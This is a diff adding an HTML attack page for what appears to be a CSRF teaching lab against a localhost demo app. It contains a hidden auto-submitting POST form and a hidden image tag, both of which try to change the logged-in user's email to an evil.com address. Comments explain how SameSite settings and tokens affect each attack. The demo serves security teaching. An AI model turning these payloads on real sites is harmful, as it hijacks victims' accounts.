@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Totally Not Evil Website</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 60px auto; padding: 0 20px; }
+    .warn { background: #fde2e1; color: #b3261e; padding: 12px 16px; border-radius: 6px; margin-bottom: 20px; }
+    code { background: #f2f2f2; padding: 2px 6px; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <div class="warn">
+    This page simulates a malicious/compromised site. It never asks you
+    for a password -- it relies entirely on cookies your browser is
+    already holding for the demo app.
+  </div>
+
+  <h1>Free Prizes! Click Anywhere!</h1>
+  <p>
+    (Meanwhile, in the background, this page is trying to change the
+    logged-in user's account email on <code>http://localhost:3000</code>.)
+  </p>
+
+  <!--
+    ATTACK 1: hidden auto-submitting POST form.
+    Targets the POST /account/email endpoint. Whether this succeeds
+    depends entirely on the victim app's cookie SameSite setting and
+    whether a CSRF token is required. In "protected" mode this fails
+    on both counts.
+  -->
+  <form id="csrf-post-form" action="http://localhost:3000/account/email" method="POST" style="display:none">
+    <input type="email" name="email" value="attacker-controlled@evil.com" />
+  </form>
+
+  <!--
+    ATTACK 2: GET-based state change via a plain image tag.
+    This only works against the vulnerable build, which (badly) exposes
+    a GET endpoint for changing the email. SameSite=Lax does NOT block
+    this, because Lax still allows top-level/simple cross-site GET
+    requests to carry cookies. This is why "never change state on GET"
+    is rule #1, independent of any CSRF token or SameSite setting.
+  -->
+  <img
+    src="http://localhost:3000/account/email?email=hacked-via-get@evil.com"
+    style="display:none"
+    alt=""
+  />
+
+  <script>
+    document.getElementById("csrf-post-form").submit();
+  </script>
+
+  <p style="margin-top: 40px; font-size: 13px; color: #666;">
+    After this page loads, go back to the demo app's <code>/dashboard</code>
+    (in the same browser, still logged in) and refresh to see whether the
+    email address changed.
+  </p>
+</body>
+</html>
